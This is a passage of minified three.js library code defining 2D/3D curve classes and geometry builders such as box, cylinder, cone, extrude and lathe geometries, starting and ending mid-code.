v,C;0!==u&&(v=Math.cos(u),C=Math.sin(u));for(t=1;t<=p;t++){q=t/p;k||(q=1-q);q=g+q*n;m=e+l*Math.cos(q);q=f+h*Math.sin(q);if(0!==u){var w=m;m=(w-e)*v-(q-\nf)*C+e;q=(w-e)*C+(q-f)*v+f}d.push(new THREE.Vector2(m,q))}}}a=d[d.length-1];Math.abs(a.x-d[0].x)<Number.EPSILON&&Math.abs(a.y-d[0].y)<Number.EPSILON&&d.splice(d.length-1,1);this.autoClose&&d.push(d[0]);return d},toShapes:function(a,b){function c(a){for(var b=[],c=0,d=a.length;c<d;c++){var e=a[c],f=new THREE.Shape;f.actions=e.actions;f.curves=e.curves;b.push(f)}return b}function d(a,b){for(var c=b.length,d=!1,e=c-1,f=0;f<c;e=f++){var g=b[e],h=b[f],k=h.x-g.x,l=h.y-g.y;if(Math.abs(l)>Number.EPSILON){if(0>\nl&&(g=b[f],k=-k,h=b[e],l=-l),!(a.y<g.y||a.y>h.y))if(a.y===g.y){if(a.x===g.x)return!0}else{e=l*(a.x-g.x)-k*(a.y-g.y);if(0===e)return!0;0>e||(d=!d)}}else if(a.y===g.y&&(h.x<=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return d}var e=THREE.ShapeUtils.isClockWise,f=function(a){for(var b=[],c=new THREE.Path,d=0,e=a.length;d<e;d++){var f=a[d],g=f.args,f=f.action;\"moveTo\"===f&&0!==c.actions.length&&(b.push(c),c=new THREE.Path);c[f].apply(c,g)}0!==c.actions.length&&b.push(c);return b}(this.actions);if(0===\nf.length)return[];if(!0===b)return c(f);var g,h,k,l=[];if(1===f.length)return h=f[0],k=new THREE.Shape,k.actions=h.actions,k.curves=h.curves,l.push(k),l;var n=!e(f[0].getPoints()),n=a?!n:n;k=[];var p=[],m=[],q=0,r;p[q]=void 0;m[q]=[];for(var s=0,t=f.length;s<t;s++)h=f[s],r=h.getPoints(),g=e(r),(g=a?!g:g)?(!n&&p[q]&&q++,p[q]={s:new THREE.Shape,p:r},p[q].s.actions=h.actions,p[q].s.curves=h.curves,n&&q++,m[q]=[]):m[q].push({h:h,p:r[0]});if(!p[0])return c(f);if(1<p.length){s=!1;h=[];e=0;for(f=p.length;e<\nf;e++)k[e]=[];e=0;for(f=p.length;e<f;e++)for(g=m[e],n=0;n<g.length;n++){q=g[n];r=!0;for(t=0;t<p.length;t++)d(q.p,p[t].p)&&(e!==t&&h.push({froms:e,tos:t,hole:n}),r?(r=!1,k[t].push(q)):s=!0);r&&k[e].push(q)}0<h.length&&(s||(m=k))}s=0;for(e=p.length;s<e;s++)for(k=p[s].s,l.push(k),h=m[s],f=0,g=h.length;f<g;f++)k.holes.push(h[f].h);return l}});THREE.Shape=function(){THREE.Path.apply(this,arguments);this.holes=[]};\nTHREE.Shape.prototype=Object.assign(Object.create(THREE.Path.prototype),{constructor:THREE.Shape,extrude:function(a){return new THREE.ExtrudeGeometry(this,a)},makeGeometry:function(a){return new THREE.ShapeGeometry(this,a)},getPointsHoles:function(a){for(var b=[],c=0,d=this.holes.length;c<d;c++)b[c]=this.holes[c].getPoints(a);return b},extractAllPoints:function(a){return{shape:this.getPoints(a),holes:this.getPointsHoles(a)}},extractPoints:function(a){return this.extractAllPoints(a)}});\nTHREE.LineCurve=function(a,b){this.v1=a;this.v2=b};THREE.LineCurve.prototype=Object.create(THREE.Curve.prototype);THREE.LineCurve.prototype.constructor=THREE.LineCurve;THREE.LineCurve.prototype.getPoint=function(a){var b=this.v2.clone().sub(this.v1);b.multiplyScalar(a).add(this.v1);return b};THREE.LineCurve.prototype.getPointAt=function(a){return this.getPoint(a)};THREE.LineCurve.prototype.getTangent=function(a){return this.v2.clone().sub(this.v1).normalize()};\nTHREE.QuadraticBezierCurve=function(a,b,c){this.v0=a;this.v1=b;this.v2=c};THREE.QuadraticBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.QuadraticBezierCurve.prototype.constructor=THREE.QuadraticBezierCurve;THREE.QuadraticBezierCurve.prototype.getPoint=function(a){var b=THREE.ShapeUtils.b2;return new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))};\nTHREE.QuadraticBezierCurve.prototype.getTangent=function(a){var b=THREE.CurveUtils.tangentQuadraticBezier;return(new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))).normalize()};THREE.CubicBezierCurve=function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d};THREE.CubicBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.CubicBezierCurve.prototype.constructor=THREE.CubicBezierCurve;\nTHREE.CubicBezierCurve.prototype.getPoint=function(a){var b=THREE.ShapeUtils.b3;return new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))};THREE.CubicBezierCurve.prototype.getTangent=function(a){var b=THREE.CurveUtils.tangentCubicBezier;return(new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))).normalize()};THREE.SplineCurve=function(a){this.points=void 0==a?[]:a};\nTHREE.SplineCurve.prototype=Object.create(THREE.Curve.prototype);THREE.SplineCurve.prototype.constructor=THREE.SplineCurve;THREE.SplineCurve.prototype.getPoint=function(a){var b=this.points;a*=b.length-1;var c=Math.floor(a);a-=c;var d=b[0===c?c:c-1],e=b[c],f=b[c>b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector2(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a))};\nTHREE.EllipseCurve=function(a,b,c,d,e,f,g,h){this.aX=a;this.aY=b;this.xRadius=c;this.yRadius=d;this.aStartAngle=e;this.aEndAngle=f;this.aClockwise=g;this.aRotation=h||0};THREE.EllipseCurve.prototype=Object.create(THREE.Curve.prototype);THREE.EllipseCurve.prototype.constructor=THREE.EllipseCurve;\nTHREE.EllipseCurve.prototype.getPoint=function(a){var b=this.aEndAngle-this.aStartAngle;0>b&&(b+=2*Math.PI);b>2*Math.PI&&(b-=2*Math.PI);b=!0===this.aClockwise?this.aEndAngle+(1-a)*(2*Math.PI-b):this.aStartAngle+a*b;a=this.aX+this.xRadius*Math.cos(b);var c=this.aY+this.yRadius*Math.sin(b);if(0!==this.aRotation){var b=Math.cos(this.aRotation),d=Math.sin(this.aRotation),e=a;a=(e-this.aX)*b-(c-this.aY)*d+this.aX;c=(e-this.aX)*d+(c-this.aY)*b+this.aY}return new THREE.Vector2(a,c)};\nTHREE.ArcCurve=function(a,b,c,d,e,f){THREE.EllipseCurve.call(this,a,b,c,c,d,e,f)};THREE.ArcCurve.prototype=Object.create(THREE.EllipseCurve.prototype);THREE.ArcCurve.prototype.constructor=THREE.ArcCurve;THREE.LineCurve3=THREE.Curve.create(function(a,b){this.v1=a;this.v2=b},function(a){var b=new THREE.Vector3;b.subVectors(this.v2,this.v1);b.multiplyScalar(a);b.add(this.v1);return b});\nTHREE.QuadraticBezierCurve3=THREE.Curve.create(function(a,b,c){this.v0=a;this.v1=b;this.v2=c},function(a){var b=THREE.ShapeUtils.b2;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y),b(a,this.v0.z,this.v1.z,this.v2.z))});\nTHREE.CubicBezierCurve3=THREE.Curve.create(function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d},function(a){var b=THREE.ShapeUtils.b3;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y),b(a,this.v0.z,this.v1.z,this.v2.z,this.v3.z))});\nTHREE.SplineCurve3=THREE.Curve.create(function(a){console.warn(\"THREE.SplineCurve3 will be deprecated. Please use THREE.CatmullRomCurve3\");this.points=void 0==a?[]:a},function(a){var b=this.points;a*=b.length-1;var c=Math.floor(a);a-=c;var d=b[0==c?c:c-1],e=b[c],f=b[c>b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector3(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a),c(d.z,e.z,f.z,b.z,a))});\nTHREE.CatmullRomCurve3=function(){function a(){}var b=new THREE.Vector3,c=new a,d=new a,e=new a;a.prototype.init=function(a,b,c,d){this.c0=a;this.c1=c;this.c2=-3*a+3*b-2*c-d;this.c3=2*a-2*b+c+d};a.prototype.initNonuniformCatmullRom=function(a,b,c,d,e,n,p){a=((b-a)/e-(c-a)/(e+n)+(c-b)/n)*n;d=((c-b)/n-(d-b)/(n+p)+(d-c)/p)*n;this.init(b,c,a,d)};a.prototype.initCatmullRom=function(a,b,c,d,e){this.init(b,c,e*(c-a),e*(d-b))};a.prototype.calc=function(a){var b=a*a;return this.c0+this.c1*a+this.c2*b+this.c3*\nb*a};return THREE.Curve.create(function(a){this.points=a||[];this.closed=!1},function(a){var g=this.points,h,k;k=g.length;2>k&&console.log(\"duh, you need at least 2 points\");a*=k-(this.closed?0:1);h=Math.floor(a);a-=h;this.closed?h+=0<h?0:(Math.floor(Math.abs(h)/g.length)+1)*g.length:0===a&&h===k-1&&(h=k-2,a=1);var l,n,p;this.closed||0<h?l=g[(h-1)%k]:(b.subVectors(g[0],g[1]).add(g[0]),l=b);n=g[h%k];p=g[(h+1)%k];this.closed||h+2<k?g=g[(h+2)%k]:(b.subVectors(g[k-1],g[k-2]).add(g[k-1]),g=b);if(void 0===\nthis.type||\"centripetal\"===this.type||\"chordal\"===this.type){var m=\"chordal\"===this.type?.5:.25;k=Math.pow(l.distanceToSquared(n),m);h=Math.pow(n.distanceToSquared(p),m);m=Math.pow(p.distanceToSquared(g),m);1E-4>h&&(h=1);1E-4>k&&(k=h);1E-4>m&&(m=h);c.initNonuniformCatmullRom(l.x,n.x,p.x,g.x,k,h,m);d.initNonuniformCatmullRom(l.y,n.y,p.y,g.y,k,h,m);e.initNonuniformCatmullRom(l.z,n.z,p.z,g.z,k,h,m)}else\"catmullrom\"===this.type&&(k=void 0!==this.tension?this.tension:.5,c.initCatmullRom(l.x,n.x,p.x,g.x,\nk),d.initCatmullRom(l.y,n.y,p.y,g.y,k),e.initCatmullRom(l.z,n.z,p.z,g.z,k));return new THREE.Vector3(c.calc(a),d.calc(a),e.calc(a))})}();THREE.ClosedSplineCurve3=function(a){console.warn(\"THREE.ClosedSplineCurve3 has been deprecated. Please use THREE.CatmullRomCurve3.\");THREE.CatmullRomCurve3.call(this,a);this.type=\"catmullrom\";this.closed=!0};THREE.ClosedSplineCurve3.prototype=Object.create(THREE.CatmullRomCurve3.prototype);\nTHREE.BoxGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"BoxGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};this.fromBufferGeometry(new THREE.BoxBufferGeometry(a,b,c,d,e,f));this.mergeVertices()};THREE.BoxGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.BoxGeometry.prototype.constructor=THREE.BoxGeometry;THREE.CubeGeometry=THREE.BoxGeometry;\nTHREE.BoxBufferGeometry=function(a,b,c,d,e,f){function g(a,b,c,d,e,f,g,k,l,K,P){var M=f/l,H=g/K,L=f/2,O=g/2,N=k/2;g=l+1;for(var Q=K+1,J=f=0,D=new THREE.Vector3,G=0;G<Q;G++)for(var aa=G*H-O,T=0;T<g;T++)D[a]=(T*M-L)*d,D[b]=aa*e,D[c]=N,p[r]=D.x,p[r+1]=D.y,p[r+2]=D.z,D[a]=0,D[b]=0,D[c]=0<k?1:-1,m[r]=D.x,m[r+1]=D.y,m[r+2]=D.z,q[s]=T/l,q[s+1]=1-G/K,r+=3,s+=2,f+=1;for(G=0;G<K;G++)for(T=0;T<l;T++)a=u+T+g*(G+1),b=u+(T+1)+g*(G+1),c=u+(T+1)+g*G,n[t]=u+T+g*G,n[t+1]=a,n[t+2]=c,n[t+3]=a,n[t+4]=b,n[t+5]=c,t+=6,\nJ+=6;h.addGroup(v,J,P);v+=J;u+=f}THREE.BufferGeometry.call(this);this.type=\"BoxBufferGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};var h=this;d=Math.floor(d)||1;e=Math.floor(e)||1;f=Math.floor(f)||1;var k=function(a,b,c){a=0+(a+1)*(b+1)*2+(a+1)*(c+1)*2;return a+=(c+1)*(b+1)*2}(d,e,f),l=function(a,b,c){a=0+a*b*2+a*c*2;a+=c*b*2;return 6*a}(d,e,f),n=new (65535<l?Uint32Array:Uint16Array)(l),p=new Float32Array(3*k),m=new Float32Array(3*k),q=new Float32Array(2*\nk),r=0,s=0,t=0,u=0,v=0;g(\"z\",\"y\",\"x\",-1,-1,c,b,a,f,e,0);g(\"z\",\"y\",\"x\",1,-1,c,b,-a,f,e,1);g(\"x\",\"z\",\"y\",1,1,a,c,b,d,f,2);g(\"x\",\"z\",\"y\",1,-1,a,c,-b,d,f,3);g(\"x\",\"y\",\"z\",1,-1,a,b,c,d,e,4);g(\"x\",\"y\",\"z\",-1,-1,a,b,-c,d,e,5);this.setIndex(new THREE.BufferAttribute(n,1));this.addAttribute(\"position\",new THREE.BufferAttribute(p,3));this.addAttribute(\"normal\",new THREE.BufferAttribute(m,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(q,2))};THREE.BoxBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);\nTHREE.BoxBufferGeometry.prototype.constructor=THREE.BoxBufferGeometry;THREE.CircleGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\"CircleGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};this.fromBufferGeometry(new THREE.CircleBufferGeometry(a,b,c,d))};THREE.CircleGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.CircleGeometry.prototype.constructor=THREE.CircleGeometry;\nTHREE.CircleBufferGeometry=function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"CircleBufferGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};a=a||50;b=void 0!==b?Math.max(3,b):8;c=void 0!==c?c:0;d=void 0!==d?d:2*Math.PI;var e=b+2,f=new Float32Array(3*e),g=new Float32Array(3*e),e=new Float32Array(2*e);g[2]=1;e[0]=.5;e[1]=.5;for(var h=0,k=3,l=2;h<=b;h++,k+=3,l+=2){var n=c+h/b*d;f[k]=a*Math.cos(n);f[k+1]=a*Math.sin(n);g[k+2]=1;e[l]=(f[k]/a+1)/2;e[l+1]=(f[k+1]/a+1)/2}c=\n[];for(k=1;k<=b;k++)c.push(k,k+1,0);this.setIndex(new THREE.BufferAttribute(new Uint16Array(c),1));this.addAttribute(\"position\",new THREE.BufferAttribute(f,3));this.addAttribute(\"normal\",new THREE.BufferAttribute(g,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(e,2));this.boundingSphere=new THREE.Sphere(new THREE.Vector3,a)};THREE.CircleBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.CircleBufferGeometry.prototype.constructor=THREE.CircleBufferGeometry;\nTHREE.CylinderBufferGeometry=function(a,b,c,d,e,f,g,h){function k(c){var e,f,k,m=new THREE.Vector2,n=new THREE.Vector3,p=0,C=!0===c?a:b,M=!0===c?1:-1;f=u;for(e=1;e<=d;e++)r.setXYZ(u,0,w*M,0),s.setXYZ(u,0,M,0),m.x=.5,m.y=.5,t.setXY(u,m.x,m.y),u++;k=u;for(e=0;e<=d;e++){var H=e/d*h+g,L=Math.cos(H),H=Math.sin(H);n.x=C*H;n.y=w*M;n.z=C*L;r.setXYZ(u,n.x,n.y,n.z);s.setXYZ(u,0,M,0);m.x=.5*L+.5;m.y=.5*H*M+.5;t.setXY(u,m.x,m.y);u++}for(e=0;e<d;e++)m=f+e,n=k+e,!0===c?(q.setX(v,n),v++,q.setX(v,n+1)):(q.setX(v,\nn+1),v++,q.setX(v,n)),v++,q.setX(v,m),v++,p+=3;l.addGroup(E,p,!0===c?1:2);E+=p}THREE.BufferGeometry.call(this);this.type=\"CylinderBufferGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};var l=this;a=void 0!==a?a:20;b=void 0!==b?b:20;c=void 0!==c?c:100;d=Math.floor(d)||8;e=Math.floor(e)||1;f=void 0!==f?f:!1;g=void 0!==g?g:0;h=void 0!==h?h:2*Math.PI;var n=0;!1===f&&(0<a&&n++,0<b&&n++);var p=function(){var a=(d+1)*\n(e+1);!1===f&&(a+=(d+1)*n+d*n);return a}(),m=function(){var a=d*e*6;!1===f&&(a+=d*n*3);return a}(),q=new THREE.BufferAttribute(new (65535<m?Uint32Array:Uint16Array)(m),1),r=new THREE.BufferAttribute(new Float32Array(3*p),3),s=new THREE.BufferAttribute(new Float32Array(3*p),3),t=new THREE.BufferAttribute(new Float32Array(2*p),2),u=0,v=0,C=[],w=c/2,E=0;(function(){var f,k,m=new THREE.Vector3,n=new THREE.Vector3,p=0,F=(b-a)/c;for(k=0;k<=e;k++){var K=[],P=k/e,M=P*(b-a)+a;for(f=0;f<=d;f++){var H=f/d;n.x=\nM*Math.sin(H*h+g);n.y=-P*c+w;n.z=M*Math.cos(H*h+g);r.setXYZ(u,n.x,n.y,n.z);m.copy(n);if(0===a&&0===k||0===b&&k===e)m.x=Math.sin(H*h+g),m.z=Math.cos(H*h+g);m.setY(Math.sqrt(m.x*m.x+m.z*m.z)*F).normalize();s.setXYZ(u,m.x,m.y,m.z);t.setXY(u,H,1-P);K.push(u);u++}C.push(K)}for(f=0;f<d;f++)for(k=0;k<e;k++)m=C[k+1][f],n=C[k+1][f+1],F=C[k][f+1],q.setX(v,C[k][f]),v++,q.setX(v,m),v++,q.setX(v,F),v++,q.setX(v,m),v++,q.setX(v,n),v++,q.setX(v,F),v++,p+=6;l.addGroup(E,p,0);E+=p})();!1===f&&(0<a&&k(!0),0<b&&k(!1));\nthis.setIndex(q);this.addAttribute(\"position\",r);this.addAttribute(\"normal\",s);this.addAttribute(\"uv\",t)};THREE.CylinderBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.CylinderBufferGeometry.prototype.constructor=THREE.CylinderBufferGeometry;\nTHREE.CylinderGeometry=function(a,b,c,d,e,f,g,h){THREE.Geometry.call(this);this.type=\"CylinderGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};this.fromBufferGeometry(new THREE.CylinderBufferGeometry(a,b,c,d,e,f,g,h));this.mergeVertices()};THREE.CylinderGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.CylinderGeometry.prototype.constructor=THREE.CylinderGeometry;\nTHREE.ConeBufferGeometry=function(a,b,c,d,e,f,g){THREE.CylinderBufferGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeBufferGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,thetaStart:f,thetaLength:g}};THREE.ConeBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.ConeBufferGeometry.prototype.constructor=THREE.ConeBufferGeometry;\nTHREE.ConeGeometry=function(a,b,c,d,e,f,g){THREE.CylinderGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}};THREE.ConeGeometry.prototype=Object.create(THREE.CylinderGeometry.prototype);THREE.ConeGeometry.prototype.constructor=THREE.ConeGeometry;\nTHREE.EdgesGeometry=function(a,b){function c(a,b){return a-b}THREE.BufferGeometry.call(this);var d=Math.cos(THREE.Math.DEG2RAD*(void 0!==b?b:1)),e=[0,0],f={},g=[\"a\",\"b\",\"c\"],h;a instanceof THREE.BufferGeometry?(h=new THREE.Geometry,h.fromBufferGeometry(a)):h=a.clone();h.mergeVertices();h.computeFaceNormals();var k=h.vertices;h=h.faces;for(var l=0,n=h.length;l<n;l++)for(var p=h[l],m=0;3>m;m++){e[0]=p[g[m]];e[1]=p[g[(m+1)%3]];e.sort(c);var q=e.toString();void 0===f[q]?f[q]={vert1:e[0],vert2:e[1],face1:l,\nface2:void 0}:f[q].face2=l}e=[];for(q in f)if(g=f[q],void 0===g.face2||h[g.face1].normal.dot(h[g.face2].normal)<=d)l=k[g.vert1],e.push(l.x),e.push(l.y),e.push(l.z),l=k[g.vert2],e.push(l.x),e.push(l.y),e.push(l.z);this.addAttribute(\"position\",new THREE.BufferAttribute(new Float32Array(e),3))};THREE.EdgesGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.EdgesGeometry.prototype.constructor=THREE.EdgesGeometry;\nTHREE.ExtrudeGeometry=function(a,b){\"undefined\"!==typeof a&&(THREE.Geometry.call(this),this.type=\"ExtrudeGeometry\",a=Array.isArray(a)?a:[a],this.addShapeList(a,b),this.computeFaceNormals())};THREE.ExtrudeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ExtrudeGeometry.prototype.constructor=THREE.ExtrudeGeometry;THREE.ExtrudeGeometry.prototype.addShapeList=function(a,b){for(var c=a.length,d=0;d<c;d++)this.addShape(a[d],b)};\nTHREE.ExtrudeGeometry.prototype.addShape=function(a,b){function c(a,b,c){b||console.error(\"THREE.ExtrudeGeometry: vec does not exist\");return b.clone().multiplyScalar(c).add(a)}function d(a,b,c){var d=1,d=a.x-b.x,e=a.y-b.y,f=c.x-a.x,g=c.y-a.y,h=d*d+e*e;if(Math.abs(d*g-e*f)>Number.EPSILON){var k=Math.sqrt(h),l=Math.sqrt(f*f+g*g),h=b.x-e/k;b=b.y+d/k;f=((c.x-g/l-h)*g-(c.y+f/l-b)*f)/(d*g-e*f);c=h+d*f-a.x;a=b+e*f-a.y;d=c*c+a*a;if(2>=d)return new THREE.Vector2(c,a);d=Math.sqrt(d/2)}else a=!1,d>Number.EPSILON?\nf>Number.EPSILON&&(a=!0):d<-Number.EPSILON?f<-Number.EPSILON&&(a=!0):Math.sign(e)===Math.sign(g)&&(a=!0),a?(c=-e,a=d,d=Math.sqrt(h)):(c=d,a=e,d=Math.sqrt(h/2));return new THREE.Vector2(c/d,a/d)}function e(a,b){var c,d;for(G=a.length;0<=--G;){c=G;d=G-1;0>d&&(d=a.length-1);for(var e=0,f=q+2*n,e=0;e<f;e++){var g=Q*e,h=Q*(e+1),k=b+c+g,g=b+d+g,l=b+d+h,h=b+c+h,k=k+B,g=g+B,l=l+B,h=h+B;I.faces.push(new THREE.Face3(k,g,h,null,null,1));I.faces.push(new THREE.Face3(g,l,h,null,null,1));k=u.generateSideWallUV(I,\nk,g,l,h);I.faceVertexUvs[0].push([k[0],k[1],k[3]]);I.faceVertexUvs[0].push([k[1],k[2],k[3]])}}}function f(a,b,c){I.vertices.push(new THREE.Vector3(a,b,c))}function g(a,b,c){a+=B;b+=B;c+=B;I.faces.push(new THREE.Face3(a,b,c,null,null,0));a=u.generateTopUV(I,a,b,c);I.faceVertexUvs[0].push(a)}var h=void 0!==b.amount?b.amount:100,k=void 0!==b.bevelThickness?b.bevelThickness:6,l=void 0!==b.bevelSize?b.bevelSize:k-2,n=void 0!==b.bevelSegments?b.bevelSegments:3,p=void 0!==b.bevelEnabled?b.bevelEnabled:!0,\nm=void 0!==b.curveSegments?b.curveSegments:12,q=void 0!==b.steps?b.steps:1,r=b.extrudePath,s,t=!1,u=void 0!==b.UVGenerator?b.UVGenerator:THREE.ExtrudeGeometry.WorldUVGenerator,v,C,w,E;r&&(s=r.getSpacedPoints(q),t=!0,p=!1,v=void 0!==b.frames?b.frames:new THREE.TubeGeometry.FrenetFrames(r,q,!1),C=new THREE.Vector3,w=new THREE.Vector3,E=new THREE.Vector3);p||(l=k=n=0);var z,y,A,I=this,B=this.vertices.length,r=a.extractPoints(m),m=r.shape,F=r.holes;if(r=!THREE.ShapeUtils.isClockWise(m)){m=m.reverse();\ny=0;for(A=F.length;y<A;y++)z=F[y],THREE.ShapeUtils.isClockWise(z)&&(F[y]=z.reverse());r=!1}var K=THREE.ShapeUtils.triangulateShape(m,F),P=m;y=0;for(A=F.length;y<A;y++)z=F[y],m=m.concat(z);var M,H,L,O,N,Q=m.length,J,D=K.length,r=[],G=0;L=P.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),r[G]=d(P[G],P[M],P[H]);var aa=[],T,X=r.concat();y=0;for(A=F.length;y<A;y++){z=F[y];T=[];G=0;L=z.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),T[G]=d(z[G],z[M],z[H]);aa.push(T);X=\nX.concat(T)}for(M=0;M<n;M++){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,-O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),f(N.x,N.y,-O)}H=l;for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[0]).multiplyScalar(N.x),C.copy(v.binormals[0]).multiplyScalar(N.y),E.copy(s[0]).add(w).add(C),f(E.x,E.y,E.z)):f(N.x,N.y,0);for(L=1;L<=q;L++)for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[L]).multiplyScalar(N.x),\nC.copy(v.binormals[L]).multiplyScalar(N.y),E.copy(s[L]).add(w).add(C),f(E.x,E.y,E.z)):f(N.x,N.y,h/q*L);for(M=n-1;0<=M;M--){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,h+O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),t?f(N.x,N.y+s[q-1].y,s[q-1].x+O):f(N.x,N.y,h+O)}(function(){if(p){var a;a=0*Q;for(G=0;G<D;G++)J=K[G],g(J[2]+a,J[1]+a,J[0]+a);a=q+2*n;a*=Q;for(G=0;G<D;G++)J=K[G],g(J[0]+a,J[1]+a,J[2]+a)}else{for(G=\n0;G<D;G++)J=K[G],g(J[2],J[1],J[0]);for(G=0;G<D;G++)J=K[G],g(J[0]+Q*q,J[1]+Q*q,J[2]+Q*q)}})();(function(){var a=0;e(P,a);a+=P.length;y=0;for(A=F.length;y<A;y++)z=F[y],e(z,a),a+=z.length})()};\nTHREE.ExtrudeGeometry.WorldUVGenerator={generateTopUV:function(a,b,c,d){a=a.vertices;b=a[b];c=a[c];d=a[d];return[new THREE.Vector2(b.x,b.y),new THREE.Vector2(c.x,c.y),new THREE.Vector2(d.x,d.y)]},generateSideWallUV:function(a,b,c,d,e){a=a.vertices;b=a[b];c=a[c];d=a[d];e=a[e];return.01>Math.abs(b.y-c.y)?[new THREE.Vector2(b.x,1-b.z),new THREE.Vector2(c.x,1-c.z),new THREE.Vector2(d.x,1-d.z),new THREE.Vector2(e.x,1-e.z)]:[new THREE.Vector2(b.y,1-b.z),new THREE.Vector2(c.y,1-c.z),new THREE.Vector2(d.y,\n1-d.z),new THREE.Vector2(e.y,1-e.z)]}};THREE.ShapeGeometry=function(a,b){THREE.Geometry.call(this);this.type=\"ShapeGeometry\";!1===Array.isArray(a)&&(a=[a]);this.addShapeList(a,b);this.computeFaceNormals()};THREE.ShapeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ShapeGeometry.prototype.constructor=THREE.ShapeGeometry;THREE.ShapeGeometry.prototype.addShapeList=function(a,b){for(var c=0,d=a.length;c<d;c++)this.addShape(a[c],b);return this};\nTHREE.ShapeGeometry.prototype.addShape=function(a,b){void 0===b&&(b={});var c=b.material,d=void 0===b.UVGenerator?THREE.ExtrudeGeometry.WorldUVGenerator:b.UVGenerator,e,f,g,h=this.vertices.length;e=a.extractPoints(void 0!==b.curveSegments?b.curveSegments:12);var k=e.shape,l=e.holes;if(!THREE.ShapeUtils.isClockWise(k))for(k=k.reverse(),e=0,f=l.length;e<f;e++)g=l[e],THREE.ShapeUtils.isClockWise(g)&&(l[e]=g.reverse());var n=THREE.ShapeUtils.triangulateShape(k,l);e=0;for(f=l.length;e<f;e++)g=l[e],k=k.concat(g);\nl=k.length;f=n.length;for(e=0;e<l;e++)g=k[e],this.vertices.push(new THREE.Vector3(g.x,g.y,0));for(e=0;e<f;e++)l=n[e],k=l[0]+h,g=l[1]+h,l=l[2]+h,this.faces.push(new THREE.Face3(k,g,l,null,null,c)),this.faceVertexUvs[0].push(d.generateTopUV(this,k,g,l))};\nTHREE.LatheBufferGeometry=function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"LatheBufferGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};b=Math.floor(b)||12;c=c||0;d=d||2*Math.PI;d=THREE.Math.clamp(d,0,2*Math.PI);for(var e=(b+1)*a.length,f=b*a.length*6,g=new THREE.BufferAttribute(new (65535<f?Uint32Array:Uint16Array)(f),1),h=new THREE.BufferAttribute(new Float32Array(3*e),3),k=new THREE.BufferAttribute(new Float32Array(2*e),2),l=0,n=0,p=1/b,m=new THREE.Vector3,q=new THREE.Vector2,\ne=0;e<=b;e++)for(var 